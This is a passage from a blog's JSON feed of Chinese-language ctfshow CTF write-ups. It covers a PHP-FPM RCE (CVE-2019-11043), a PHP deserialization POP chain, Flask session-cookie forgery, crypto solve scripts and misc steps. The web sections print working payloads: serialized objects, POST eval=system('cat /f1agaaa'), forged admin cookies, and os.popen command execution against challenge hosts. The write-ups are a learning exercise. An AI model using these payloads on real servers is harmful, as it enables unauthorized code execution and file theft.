github.com/spf13/cobra@v0.0.5: Get \"https://proxy.golang.org/github.com/spf13/cobra/@v/v0.0.5.mod\": dial tcp 142.251.43.17:443: connect: connection refused\ngo: github.com/spf13/cobra@v0.0.5: Get \"https://proxy.golang.org/github.com/spf13/cobra/@v/v0.0.5.mod\": dial tcp 142.251.43.17:443: connect: connection refused\n</code></pre>\n<p>原因为go代理默认为国外，</p>\n<pre><code class=\"bash\">go env -w GOPROXY=https://goproxy.cn\n</code></pre>\n<ol>\n<li><p>进行修改</p>\n</li>\n<li><p>重复第三步</p>\n</li>\n</ol>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/%E4%B8%80%E8%A7%88%E6%97%A0%E4%BD%99_1.jpg\"></p>\n<p>出现此下载完成</p>\n<h4 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h4><pre><code class=\"火绒\">\n出现 done! 即为执行成功\n\n执行成功，那么即可通过 url/index.php?a=shellcode(ls等)\n只有部分 PHP-FPM 子进程受到了污染，因此需要尝试几次以执行该命令。\n</code></pre>\n<p>参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3VuZXhwZWN0ZWR0aGluZy9hcnRpY2xlL2RldGFpbHMvMTIxMTMzMzAy\">https://blog.csdn.net/unexpectedthing/article/details/121133302</span></p>\n<p>参考：<span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cubGVhbm90ZS5jb20vcG9zdC9zbm93bWluZy85ZGExODRlZjI0YmQ=\">PHP-FPM 远程代码执行漏洞（CVE-2019-11043）</span><br>PHP 远程代码执行漏洞复现（CVE-2019-11043）【反弹 shell 成功】</p>\n<p>PHP-FPM 远程代码执行漏洞（CVE-2019-11043）</p>\n<p>PHP 远程代码执行漏洞复现（CVE-2019-11043）【反弹 shell 成功】</p>\n<h1 id=\"Reverse\"><a href=\"#Reverse\" class=\"headerlink\" title=\"Reverse\"></a>Reverse</h1><h2 id=\"真的是签到\"><a href=\"#真的是签到\" class=\"headerlink\" title=\"真的是签到\"></a>真的是签到</h2><p>查看下载的文件，伪加密，修改后解压，得到<code>签到.exe</code></p>\n<p>ExeinfoPE查壳，发现为Aspack</p>\n<p><img data-src=\"E:\\blog\\source\\素材\\ctfshow\\reverse\\内部赛_真的是签到_1.jpg\"></p>\n<p>脱壳后再查看,发现为UPX加壳</p>\n<p><img data-src=\"E:\\blog\\source\\素材\\ctfshow\\reverse\\内部赛_真的是签到_2.jpg\"></p>\n<p>脱壳后，发现没有壳了，IDA打开</p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/d0dbb8d4/",
            "url": "http://dpm12345.cn/posts/d0dbb8d4/",
            "title": "2023愚人杯",
            "date_published": "2022-10-04T15:38:40.000Z",
            "content_html": "<p>最终得分为<u>1500</u></p>\n<p><img data-src=\"/../../../post_images/ctfshow/%E6%84%9A%E4%BA%BA%E6%9D%AF2023/output.png\"></p>\n<h1 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h1><h2 id=\"easy-signin\"><a href=\"#easy-signin\" class=\"headerlink\" title=\"easy_signin\"></a>easy_signin</h2><p>img参数可以传参，传入<code>index.php</code>的base64编码</p>\n<p>利用读文件，读出index.php</p>\n<h2 id=\"easy-ssti\"><a href=\"#easy-ssti\" class=\"headerlink\" title=\"easy_ssti\"></a>easy_ssti</h2><p>这道题其实是比较简单的</p>\n<p>但由于他为直接在网址进行SSTI模板注入，故在列出根目录时，<code>/</code>会作为网址的一部分，导致404错误，故这里还需要进行绕过，比如<code>request.args.a</code><del>(卡了我好久)</del></p>\n<h2 id=\"被遗忘的反序列化\"><a href=\"#被遗忘的反序列化\" class=\"headerlink\" title=\"被遗忘的反序列化\"></a>被遗忘的反序列化</h2><pre><code class=\"php\">&lt;?php\n\n# 当前目录中有一个txt文件哦\nerror_reporting(0);\nshow_source(__FILE__);\ninclude(\"check.php\");\n\nclass EeE{\n    public $text;\n    public $eeee;\n    public function __wakeup(){\n        if ($this-&gt;text == \"aaaa\"){\n            echo lcfirst($this-&gt;text);\n        }\n    }\n\n    public function __get($kk){\n        echo \"$kk,eeeeeeeeeeeee\";\n    }\n\n    public function __clone(){\n        $a = new cycycycy;\n        $a -&gt; aaa();\n    }\n    \n}\n\nclass cycycycy{\n    public $a;\n    private $b;\n\n    public function aaa(){\n        $get = $_GET['get'];\n        $get = cipher($get);\n        if($get === \"p8vfuv8g8v8py\"){\n            eval($_POST[\"eval\"]);\n        }\n    }\n\n\n    public function __invoke(){\n        $a_a = $this -&gt; a;\n        echo \"\\$a_a\\$\";\n    }\n}\n\nclass gBoBg{\n    public $name;\n    public $file;\n    public $coos;\n    private $eeee=\"-_-\";\n    public function __toString(){\n        if(isset($this-&gt;name)){\n            $a = new $this-&gt;coos($this-&gt;file);\n            echo $a;\n        }else if(!isset($this -&gt; file)){\n            return $this-&gt;coos-&gt;name;\n        }else{\n            $aa = $this-&gt;coos;\n            $bb = $this-&gt;file;\n            return $aa();\n        }\n    }\n}   \n\nclass w_wuw_w{\n    public $aaa;\n    public $key;\n    public $file;\n    public function __wakeup(){\n        if(!preg_match(\"/php|63|\\*|\\?/i\",$this -&gt; key)){\n            $this-&gt;key = file_get_contents($this -&gt; file);\n        }else{\n            echo \"不行哦\";\n        }\n    }\n\n    public function __destruct(){\n        echo $this-&gt;aaa;\n    }\n\n    public function __invoke(){\n        $this -&gt; aaa = clone new EeE;\n    }\n}\n\n$_ip = $_SERVER[\"HTTP_AAAAAA\"];\nunserialize($_ip);\n</code></pre>\n<p>这题做得比较艰难</p>\n<p>一开始并不知道<code>$_SERVER[\"HTTP_AAAAAA\"]</code>，后经过输出<code>$_SERVER</code>可知，<code>AAAAAA</code>即为上传时的参数名，所以可以hackbar的修改请求头上传</p>\n<p>大致做题过程为:</p>\n<ol>\n<li><p>浏览大致代码，很容易可以判断出反序列化起点为类<code>w_wuw_w</code>，利用开始点为<code>__destruct()</code></p>\n</li>\n<li><p>当<code>__destruct()</code>执行后，会将<code>$this-&gt;aaa</code>当作字符串进行输出，而<code>gBoBg</code>恰好有<code>__String()</code>方法，于是进入该方法</p>\n</li>\n<li><p>可以看到该方法中有三段的判断</p>\n<ol>\n<li>创建一个类名为<code>$this-&gt;coos</code>的类对象，然后<code>echo</code></li>\n<li>第二段返回<code>$this-&gt;coos</code>的<code>name</code>属性</li>\n<li>第三段是将<code>$this-&gt;coos</code>当作函数来使用。</li>\n</ol>\n</li>\n<li><p>第一段：这是无法利用的，因为<code>echo</code>还是需要其有<code>__String()</code>，但代码中有此方法的只有<code>gBoBg</code>，如果传这个，那么就进入死循环，也解不出来</p>\n<p>第二段：这里能利用的类只有<code>EeE</code>，但可以看到，最后会输出<code>name</code>加上一堆的<code>e</code>，而<code>name</code>在进入该判断时，必为空，故也没用</p>\n<p>第三段：这里涉及到的是魔术方法<code>__invoke</code>，当对象被当作函数使用时，会调用此魔术方法。浏览整段代码，可知<code>cycycycy</code>和<code>w_wuw_w</code>均有此魔术方法，但在<code>cycycycy</code>中，该方法的调用只会输出<code>\\$a_a\\$</code>，没有用，而且在<code>w_wuw_w</code>中，<code>__invoke()</code>恰好<code>clone</code>了一个新的对象，而这<code>clone</code>的魔术方法在<code>EeE</code>中已实现,而且会执行<code>cycycycy</code>的<code>aaa()</code>方法，该方法中有<code>eval</code>，故这段有用</p>\n<p>综上，采用第三段的逻辑，故要使得<code>name</code>为空，<code>file</code>不为空。</p>\n</li>\n<li><p>由上，可以进入<code>aaa</code>方法，可以看到，当所上传的<code>get</code>被<code>cipher</code>处理后等于<code>p8vfuv8g8v8py</code>时，则会执行<code>eval</code></p>\n</li>\n</ol>\n<p>综上可知，大致要求为</p>\n<p>创建一个<code>w_wuw_w</code>对象，其属性<code>aaa</code>为<code>gBoBg</code>的类对象，<code>aaa</code>的<code>name</code>不赋值，<code>file</code>赋值，<code>coos</code>为<code>w_wuw_w</code>对象</p>\n<p>而接下来的目标是为了获取<code>get</code>应该上传什么，根据<code>include</code>，可猜测<code>cipher</code>的定义实现在<code>check.php</code>中</p>\n<p>在这里，利用了<code>w_wuw_w</code>类中<code>__wakeup</code>的<code>file_get_contents</code>，通过php伪协议读取文件<del>(尝试了好久)</del>，将文件内容存到<code>$this-&gt;key</code>中，而为了能够读出，由<code>__destruct()</code>会输出<code>aaa</code>,故可将<code>$this-&gt;aaa</code>指向<code>$this-&gt;key</code>,即<code>$this-&gt;aaa = &amp;$this-&gt;key</code></p>\n<p>故代码为</p>\n<pre><code class=\"php\">&lt;?php\n# 当前目录中有一个txt文件哦\n// error_reporting(0);\nshow_source(__FILE__);\ninclude(\"check.php\");\n\nclass EeE{\n    public $text;\n    public $eeee;\n    public function __wakeup(){\n        if ($this-&gt;text == \"aaaa\"){\n            echo lcfirst($this-&gt;text);\n        }\n    }\n\n    public function __get($kk){\n        echo \"$kk,eeeeeeeeeeeee\";\n    }\n\n    public function __clone(){\n        $a = new cycycycy;\n        $a -&gt; aaa();\n    }\n    \n}\n\nclass cycycycy{\n    public $a;\n    private $b;\n\n    public function aaa(){\n        $get = $_GET['get'];\n        $get = cipher($get);\n        if($get === \"p8vfuv8g8v8py\"){\n            eval($_POST[\"eval\"]);\n        }\n    }\n\n\n    public function __invoke(){\n        $a_a = $this -&gt; a;\n        echo \"\\$a_a\\$\";\n    }\n}\n\nclass gBoBg{\n    public $name;\n    public $file=1;\n    public $coos;\n    private $eeee=\"-_-\";\n    public function __construct($coos)\n    {\n        $this-&gt;coos = $coos;\n    }\n    public function __toString(){\n        if(isset($this-&gt;name)){\n            $a = new $this-&gt;coos($this-&gt;file);\n            echo $a;\n        }else if(!isset($this -&gt; file)){\n            return $this-&gt;coos-&gt;name;\n        }else{\n            $aa = $this-&gt;coos;\n            $bb = $this-&gt;file;\n            return $aa();\n        }\n    }\n}   \n\nclass w_wuw_w{\n    public $aaa;\n    public $key;\n    public $file = \"php://filter/convert.base64-encode/resource=check.php\";\n    public function __construct($a)\n    {\n        $this-&gt;aaa = &amp;$this-&gt;key;\n    }\n    public function __wakeup(){\n        if(!preg_match(\"/php|63|\\*|\\?/i\",$this -&gt; key)){\n            $this-&gt;key = file_get_contents($this -&gt; file);\n        }else{\n            echo \"不行哦\";\n        }\n    }\n\n    public function __destruct(){\n        echo $this-&gt;aaa;\n    }\n\n    public function __invoke(){\n        $this -&gt; aaa = clone new EeE;\n    }\n}\n$a = new w_wuw_w(1);\necho (serialize($a));\n</code></pre>\n<p>得到的序列化字符串</p>\n<pre><code class=\"raw\">O:7:\"w_wuw_w\":3:{s:3:\"aaa\";N;s:3:\"key\";R:2;s:4:\"file\";s:53:\"php://filter/convert.base64-encode/resource=check.php\";}\n</code></pre>\n<p>传入，得到base64代码，解码后，得到check.php</p>\n<pre><code class=\"php\">&lt;?php\nfunction cipher($str) {\n\n    if(strlen($str)&gt;10000){\n        exit(-1);\n    }\n    $charset = \"qwertyuiopasdfghjklzxcvbnm123456789\";\n    $shift = 4;\n    $shifted = \"\";\n\n    for ($i = 0; $i &lt; strlen($str); $i++) {\n        $char = $str[$i];\n        $pos = strpos($charset, $char);\n\n        if ($pos !== false) {\n            $new_pos = ($pos - $shift + strlen($charset)) % strlen($charset);\n            $shifted .= $charset[$new_pos];\n        } else {\n            $shifted .= $char;\n        }\n    }\n\n    return $shifted;\n}\n</code></pre>\n<p>经过分析，很容易得出加密流程为，首先定位提供的字符串每一位字符在<code>charset</code>字符串中的位置，然后将其位置在<code>charset</code>中偏移4位，将偏移后的字符加入到<code>$shifted</code>中</p>\n<p>于是解密脚本为</p>\n<pre><code class=\"python\">a = \"p8vfuv8g8v8py\"\ncharset = \"qwertyuiopasdfghjklzxcvbnm123456789\"\n\nfor x in a:\n    index = (charset.index(x) + 4) % len(charset)\n    print(charset[index],end=\"\")\n</code></pre>\n<p>得到字符串<code>fe1ka1ele1efp</code>，经验证是正确的</p>\n<p>故生成新的序列化字符串，代码为</p>\n<pre><code class=\"php\">&lt;?php\n\n# 当前目录中有一个txt文件哦\n// error_reporting(0);\nshow_source(__FILE__);\ninclude(\"check.php\");\n\nclass EeE{\n    public $text;\n    public $eeee;\n    public function __wakeup(){\n        if ($this-&gt;text == \"aaaa\"){\n            echo lcfirst($this-&gt;text);\n        }\n    }\n\n    public function __get($kk){\n        echo \"$kk,eeeeeeeeeeeee\";\n    }\n\n    public function __clone(){\n        $a = new cycycycy;\n        $a -&gt; aaa();\n    }\n    \n}\n\nclass cycycycy{\n    public $a;\n    private $b;\n\n    public function aaa(){\n        $get = $_GET['get'];\n        $get = cipher($get);\n        if($get === \"p8vfuv8g8v8py\"){\n            eval($_POST[\"eval\"]);\n        }\n    }\n\n\n    public function __invoke(){\n        $a_a = $this -&gt; a;\n        echo \"\\$a_a\\$\";\n    }\n}\n\nclass gBoBg{\n    public $name;\n    public $file=1;\n    public $coos;\n    private $eeee=\"-_-\";\n    public function __construct($coos)\n    {\n        $this-&gt;coos = $coos;\n    }\n    public function __toString(){\n        if(isset($this-&gt;name)){\n            $a = new $this-&gt;coos($this-&gt;file);\n            echo $a;\n        }else if(!isset($this -&gt; file)){\n            return $this-&gt;coos-&gt;name;\n        }else{\n            $aa = $this-&gt;coos;\n            $bb = $this-&gt;file;\n            return $aa();\n        }\n    }\n}   \n\nclass w_wuw_w{\n    public $aaa;\n    public $key;\n    public $file;\n    public function __construct($a)\n    {\n        $this-&gt;aaa = $a;\n    }\n    public function __wakeup(){\n        if(!preg_match(\"/php|63|\\*|\\?/i\",$this -&gt; key)){\n            $this-&gt;key = file_get_contents($this -&gt; file);\n        }else{\n            echo \"不行哦\";\n        }\n    }\n\n    public function __destruct(){\n        echo $this-&gt;aaa;\n    }\n\n    public function __invoke(){\n        $this -&gt; aaa = clone new EeE;\n    }\n}\nfunction cd(){\n    echo 52;\n}\n$a = new w_wuw_w(new gBoBg(new w_wuw_w(\"1\")));\necho (serialize($a));\n</code></pre>\n<p>得到字符串</p>\n<pre><code class=\"raw\">O:7:\"w_wuw_w\":3:{s:3:\"aaa\";O:5:\"gBoBg\":4:{s:4:\"name\";N;s:4:\"file\";i:1;s:4:\"coos\";O:7:\"w_wuw_w\":3:{s:3:\"aaa\";s:1:\"1\";s:3:\"key\";N;s:4:\"file\";N;}s:11:\"gBoBgeeee\";s:3:\"-_-\";}s:3:\"key\";N;s:4:\"file\";N;}\n</code></pre>\n<p>这里注意到<code>s:11:\"gBoBgeeee\";</code>，这会使得反序列化失败(不清楚为什么会序列化成这样)，于是将<code>11</code>改为<code>9</code></p>\n<p>上传</p>\n<pre><code class=\"raw\">AAAAAA=O:7:\"w_wuw_w\":3:{s:3:\"aaa\";O:5:\"gBoBg\":4:{s:4:\"name\";N;s:4:\"file\";i:1;s:4:\"coos\";O:7:\"w_wuw_w\":3:{s:3:\"aaa\";s:1:\"1\";s:3:\"key\";N;s:4:\"file\";N;}s:9:\"gBoBgeeee\";s:3:\"-_-\";}s:3:\"key\";N;s:4:\"file\";N;}\n\nGET: http://0e1fa161-89d4-4361-a690-a82daae59b8e.challenge.ctf.show/?get=fe1ka1ele1efp\nPOST: eval=system('ls');\n      eval=system('ls /');\n      eval=system('cat /f1agaaa');\n</code></pre>\n<p>得到flag</p>\n<p>（这里在进行<code>system('ls')</code>时，会发现之前说的<code>txt</code>文件为<code>h1nt.txt</code>，其内容为<code>\\#用于check.php key：qwertyuiopasdfghjklzxcvbnm123456789 move：2~4</code>，这里提示较少，不如直接读<code>check.php</code>） <del>之前试过文件名是不是<code>hint.txt</code>，就差一点，但也恨当时已经可以读文件了，却还要纠结于txt文件，不如读<code>check.php</code></del></p>\n<p>(wp的思想是先使得file=/*.txt,然后利用原生类来获取txt的文件名，之后获取txt文件的内容，得到提示，然后爆破加密的移动的位数，然后得到加密流程，之后和我的做法一样)</p>\n<p>但是我读到的<code>h1nt.txt</code>并不是在根目录(</p>\n<p>看来是非预期解</p>\n<h1 id=\"crypto\"><a href=\"#crypto\" class=\"headerlink\" title=\"crypto\"></a>crypto</h1><h2 id=\"easy-base\"><a href=\"#easy-base\" class=\"headerlink\" title=\"easy_base\"></a>easy_base</h2><p>base16 + base32 + base64</p>\n<h2 id=\"大牛的密码\"><a href=\"#大牛的密码\" class=\"headerlink\" title=\"大牛的密码\"></a>大牛的密码</h2><p>给的加密脚本</p>\n<pre><code class=\"python\">from Crypto.Util.number import *\nfrom flag import flag\nfrom Crypto.Util.Padding import pad\nfrom random import *\ndef s_box(a):\n    box=[i for i in range(a)]\n    shuffle(box)\n    return box\nBLOCK=16\nflag=pad(flag,BLOCK)\nS_BOX=s_box(len(flag))\nm=[i for i in flag]\ndef swap(a,b):\n    tmp = a\n    a = b\n    b = tmp\ndef encrypt1(m):\n    enc=[m[i:i+BLOCK] for i in range(0,len(m),BLOCK)]\n    for i in enc:\n        for j in range(BLOCK):\n            aa=j*7%BLOCK\n            swap(i[j],i[aa])\ndef encrypt2(m):\n    for i in range(16):\n        m=[m[i] for i in S_BOX]\n    return m\nencrypt1(m)\nc=encrypt2(m)\nprint(S_BOX)\nprint(c)\n'''\n[9, 31, 32, 38, 20, 1, 22, 4, 8, 2, 11, 21, 7, 18, 46, 23, 34, 3, 19, 12, 45, 30, 27, 37, 5, 47, 28, 36, 0, 43, 39, 10, 29, 14, 40, 24, 33, 16, 17, 6, 42, 15, 26, 41, 44, 25, 35, 13]\n[99, 111, 102, 11, 107, 49, 11, 53, 121, 48, 114, 117, 11, 95, 112, 95, 109, 115, 11, 95, 101, 95, 119, 117, 79, 123, 111, 48, 110, 95, 121, 116, 121, 125, 116, 11, 119, 11, 97, 67, 11, 11, 11, 11, 11, 99, 110, 104]\n'''\n</code></pre>\n<p>比较简单的一个分组密码</p>\n<p>给出解密脚本</p>\n<pre><code class=\"python\">BLOCK=16\nS_BOX = [9, 31, 32, 38, 20, 1, 22, 4, 8, 2, 11, 21, 7, 18, 46, 23, 34, 3, 19, 12, 45, 30, 27, 37, 5, 47, 28, 36, 0, 43, 39, 10, 29, 14, 40, 24, 33, 16, 17, 6, 42, 15, 26, 41, 44, 25, 35, 13]\ndef encrypt1(m):\n    enc=[m[i:i+BLOCK] for i in range(0,len(m),BLOCK)]\n    for i in enc:\n        for j in range(BLOCK):\n            aa=j*7%BLOCK\n            swap(i[j],i[aa])\ndef encrypt2(m):\n    for i in range(16):\n        m=[m[i] for i in S_BOX]\n    return m\n\ndef de(m):\n    for i in range(16):\n        print(m)\n        tmp = [0]*len(m)\n        j = 0\n        for index in S_BOX:\n            tmp[index] = m[j]\n            j+=1\n        m = tmp\n    return m\n\nm = [99, 111, 102, 11, 107, 49, 11, 53, 121, 48, 114, 117, 11, 95, 112, 95, 109, 115, 11, 95, 101, 95, 119, 117, 79, 123, 111, 48, 110, 95, 121, 116, 121, 125, 116, 11, 119, 11, 97, 67, 11, 11, 11, 11, 11, 99, 110, 104]\n# print(m)\nm = de(m)\nencrypt1(m)\nfor i in m:\n        print(chr(i),end=\"\")\n</code></pre>\n<p>大致加密流程为，先使用<code>pad</code>将原来的flag进行扩充达到可分组的长度，然后，组内交换，最后使用S盒进行16轮置换</p>\n<p>解密流程为，逆向16轮S盒置换，然后因为组内置换加解密同代码，故解密脚本如上</p>\n<h2 id=\"easy-mini\"><a href=\"#easy-mini\" class=\"headerlink\" title=\"easy_mini\"></a>easy_mini</h2><pre><code class=\"python\">p = 71397796933602469825964946338224836258949974632540581233301840806613437378503\na = 34707491256665545391276236596452538912073367128507057339946181246439062354614\nb = 4772744837719404570039488103932889286126236975047018081148463521123562429424\nE = EllipticCurve(GF(p), [a, b])\nc1 = E(37414446283406201193977113266234367761786780230360175925999700345196415953455,17037724145039910971426670298726906655653040365428438334942732090559637519851)\nc2 = E(60560423732267272277570046154733119097475794979191838027420415113112056962844,54372226143125971429691267751299496959531971082475860532181772357190222938465)\nk = 58155941823118858940343657716409231510854647214870891375273032214774400828217\nm = c1-k*c2\nw2 =16315249811700998894876359855091105114973337718373913477026230968747515636405\nprint(w2/m[0])\n# 7196365442241205186856420688221367789171469258517476477\nm2 = 7196365442241205186856420688221367789171469258517476477\nfor i in range(0,100000):\n    num = str(i) + str(m2)\n    s = long_to_bytes(int(num))\n    if s.startswith(b\"ctfshow{\"):\n        print(s)\n        break\n# ctfshow{the_answer_is_it}\n</code></pre>\n<h2 id=\"easy-xor\"><a href=\"#easy-xor\" class=\"headerlink\" title=\"easy_xor\"></a>easy_xor</h2><pre><code class=\"python\">from Crypto.Util.number import *\nimport gmpy2\n# from secret import flag\n'''\nassert len(flag[8:-1])==23\nm = bytes_to_long(flag)\np = getPrime(1024)\nq = getPrime(1024)\nn = p*q\ne = 65537\nc1 = m^p\nc2 = pow(m,e,n)\nprint(f'c1 = {c1}')\nprint(f'c2 = {c2}')\nprint(f'n = {n}')\n'''\nc1 = 151198307301713399973545627808177783191262282577048906899567665485020342464366268384613589477129150406859219553325982275344405383612415523342568367197935454935162234419239807109194526080836070453102172720442102673200212658553214847476648456720629906051324248179394810385918370092764118401652990951968387233220\nc2 = 7894512574379281106340582833782408137686355961537832816105517328532111343730615739255485918919146012721446905489729048235088965936700563973759759039693443386542070451737445467143517377017890468837697907596398070608179281207203217576205857817411996178441661371846647602166663752324880657668362355493701482869858528298247422875427747085642627978367348931707497113936723122393282697211257939351221141536029828744507560524637999804394951722319070365576391442828074457050403771353328835153787572457070779602728359333021922987279454923820866436212282592764768470608545881718922440010751845730974331917142224339664090863915\nn = 20873587976264698212013861921447267548758723109929620330136081844796427967720295581580927324390713931549639540337285515365487607593546367886570408812338077846317206794057714877394609181224434104303259411081376607299962306250984285173463537669954845497211859940191392861121877814873939865829555350848523691546006073264112091406848179785659505299775196062799482197712761744192962658799557108701192680225134300686608396391566674966897700511638643429161735764600752699251493599533703928135311599575989253347234975026924804433742500175666009324057320386262109587593814197687132304704244158862263859846356497849518103755981\nk = 256\nR.&lt;x&gt; = PolynomialRing(Zmod(n))\nc = (c1&gt;&gt;k)&lt;&lt;k\nf = c + x\nx0 = f.small_roots(2^k,beta=0.4)[0]\n\nm = c1.__xor__(int(x0))\n\nprint(long_to_bytes(m))\n</code></pre>\n<p>p的高位攻击，得到</p>\n<pre><code class=\"raw\">b\"\\xd7PC\\xf0:\\xb67\\xc5\\x9fO+S\\xd0\\xe5eV\\xdc\\x19\\xff\\xf21\\xb4\\xf8L\\xd7C\\x9a\\xcaK\\xba\\xe8\\xa0!'\\x81dt\\xb5\\x00K\\xf0\\xb8L\\x8e'\\xf6\\xba\\xcd\\xc9\\xceY\\xf5x^\\xa4\\xc4v\\x9e\\x03\\x08\\xb6\\xc6\\xf4\\xdb\\x13\\xce(\\x9a\\xde\\xe0B\\x15\\xdf\\x98\\xf2@V\\x92^\\x8c3\\xcdJ\\x05\\xcb-6i9E\\xbf:\\xfd\\x84t\\xccctfshow{m_xor_p_but_coppersmith}\"\n</code></pre>\n<p>（原以为算出p之后可以用rsa的知识解决，但解不出来）</p>\n<h2 id=\"easy-flask\"><a href=\"#easy-flask\" class=\"headerlink\" title=\"easy_flask\"></a>easy_flask</h2><p>根据题目所给</p>\n<pre><code class=\"python\"># app.py\nfrom flask import Flask, render_template, request, redirect, url_for, session, send_file, Response\n\n\napp = Flask(__name__)\n\n\napp.secret_key = 'S3cr3tK3y'\n\nusers = {\n\n}\n\n@app.route('/')\ndef index():\n# Check if user is loggedin\n    if 'loggedin' in session:\n        return redirect(url_for('profile'))\n    return redirect(url_for('login'))\n\n@app.route('/login/', methods=['GET', 'POST'])\ndef login():\n    msg = ''\n    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:\n        username = request.form['username']\n        password = request.form['password']\n        if username in users and password == users[username]['password']:\n            session['loggedin'] = True\n            session['username'] = username\n            session['role'] = users[username]['role']\n        return redirect(url_for('profile'))\n    else:\n        msg = 'Incorrect username/password!'\n        return render_template('login.html', msg=msg)\n\n\n@app.route('/register/', methods=['GET', 'POST'])\ndef register():\n    msg = ''\n    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:\n        username = request.form['username']\n        password = request.form['password']\n        if username in users:\n            msg = 'Account already exists!'\n        else:\n            users[username] = {'password': password, 'role': 'user'}\n            msg = 'You have successfully registered!'\n    return render_template('register.html', msg=msg)\n\n\n\n@app.route('/profile/')\ndef profile():\n    if 'loggedin' in session:\n        return render_template('profile2.html', username=session['username'], role=session['role'])\n    return redirect(url_for('login'))\n</code></pre>\n<p>一开始纠结于<code>render_template('profile2.html', username=session['username'], role=session['role'])</code>的SSTI，但废了极大工夫，并查找资料，可知，该形式不存在SSTI</p>\n<p>这里重要的点在于flask session的伪造，因为注册一个账号，<code>role</code>固定为<code>users</code>，而根据登陆后的<code>But,there are some things I only want to give to users whose role is admin.</code></p>\n<p>需要为<code>admin</code>身份才能获取更多信息</p>\n<p>这里用到flask的伪造<code>python .\\flask_session_cookie_manager3.py encode -t \"{'loggedin': True, 'role': 'admin', 'username': '{{2+5}}'}\"  -s \"S3cr3tK3y\"</code></p>\n<p>得到<code>eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiJ7ezIrNX19In0.ZCg8QA.4MmqCWcdgO7YuAko8yxXX5BA0OM</code>，修改cookie的session值，可以得到</p>\n<p><strong>Congratulations! You can download the fakeflag: <span class=\"exturl\" data-url=\"aHR0cDovLzczMzMxNDIwLTI5YjEtNDNhYS04OTExLTEwZGU5YjU0ZjdjNS5jaGFsbGVuZ2UuY3RmLnNob3cvZG93bmxvYWQvP2ZpbGVuYW1lPWZha2VmbGFnLnR4dA==\">Click here</span></strong></p>\n<p>由此，可以得到下载的位置<del>一开始在尝试下载其他的txt，如flag、hint，但都无用</del></p>\n<p>有之前给的代码，显然<code>app.py</code>没给完整，而这个下载文件有个<code>filename</code>，故尝试<code>?filename=app.py</code>，成功下载，得到完整的<code>app.py</code></p>\n<p>app.py</p>\n<pre><code class=\"python\"># app.py\nfrom flask import Flask, render_template, request, redirect, url_for, session, send_file, Response\n\n\napp = Flask(__name__)\n\n\napp.secret_key = 'S3cr3tK3y'\n\nusers = {\n    'admin': {'password': 'LKHSADSFHLA;KHLK;FSDHLK;ASFD', 'role': 'admin'}\n}\n\n\n\n@app.route('/')\ndef index():\n    # Check if user is loggedin\n    if 'loggedin' in session:\n        return redirect(url_for('profile'))\n    return redirect(url_for('login'))\n\n@app.route('/login/', methods=['GET', 'POST'])\ndef login():\n    msg = ''\n    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:\n        username = request.form['username']\n        password = request.form['password']\n        if username in users and password == users[username]['password']:\n            session['loggedin'] = True\n            session['username'] = username\n            session['role'] = users[username]['role']\n            return redirect(url_for('profile'))\n        else:\n            msg = 'Incorrect username/password!'\n    return render_template('login2.html', msg=msg)\n\n\n@app.route('/register/', methods=['GET', 'POST'])\ndef register():\n    msg = '' \n    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:\n        username = request.form['username']\n        password = request.form['password']\n        if username in users:\n            msg = 'Account already exists!'\n        else:\n            users[username] = {'password': password, 'role': 'user'}\n            msg = 'You have successfully registered!'\n    return render_template('register2.html', msg=msg)\n\n\n\n@app.route('/profile/')\ndef profile():\n    if 'loggedin' in session:\n        return render_template('profile2.html', username=session['username'], role=session['role'])\n    return redirect(url_for('login'))\n\n\n@app.route('/show/')\ndef show():\n    if 'loggedin' in session:\n        return render_template('show2.html')\n\n@app.route('/download/')\ndef download():\n    if 'loggedin' in session:\n        filename = request.args.get('filename')\n        if 'filename' in request.args:              \n            return send_file(filename, as_attachment=True)\n  \n    return redirect(url_for('login'))\n\n\n@app.route('/hello/')\ndef hello_world():\n    try:\n        s = request.args.get('eval')\n        return f\"hello,{eval(s)}\"\n    except Exception as e:\n        print(e)\n        pass\n        \n    return \"hello\"\n    \n\n\n@app.route('/logout/')\ndef logout():\n   session.pop('loggedin', None)\n   session.pop('id', None)\n   session.pop('username', None)\n   session.pop('role', None)\n   return redirect(url_for('login'))\n\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0', port=8080)\n</code></pre>\n<p>可以看到<code>/hello/</code>下有<code>eval</code>，可以执行任意代码</p>\n<p>故传入</p>\n<pre><code class=\"raw\">http://73331420-29b1-43aa-8911-10de9b54f7c5.challenge.ctf.show/hello/?eval=__import__(\"os\").popen(\"ls\").read()\nhello,app.py fakeflag.txt templates\n\nhttp://73331420-29b1-43aa-8911-10de9b54f7c5.challenge.ctf.show/hello/?eval=__import__(\"os\").popen(\"ls /\").read()\nhello,app bin dev etc flag_is_h3re home lib media mnt opt proc root run sbin srv sys tmp usr var\n\nhttp://73331420-29b1-43aa-8911-10de9b54f7c5.challenge.ctf.show/hello/?eval=__import__(\"os\").popen(\"cat /flag_is_h3re\").read()\nhello,ctfshow{487b3c1e-eff3-4c8d-846e-b4e21441a8fd}\n</code></pre>\n<h1 id=\"misc\"><a href=\"#misc\" class=\"headerlink\" title=\"misc\"></a>misc</h1><h2 id=\"奇怪的压缩包\"><a href=\"#奇怪的压缩包\" class=\"headerlink\" title=\"奇怪的压缩包\"></a>奇怪的压缩包</h2><p>首先是伪加密解除</p>\n<p>解压后，得到<code>black.png</code>,010打开，拉到后面，看到有<code>flag.png</code>，且最后有段base64<code>eXVyZW5qaWU=</code>，解码为<code>yurenjie</code>，猜测<code>black.png</code>还包含了一个密码为<code>yurenjie</code>的压缩包</p>\n<p>binwalk文件分离<code>binwalk -e 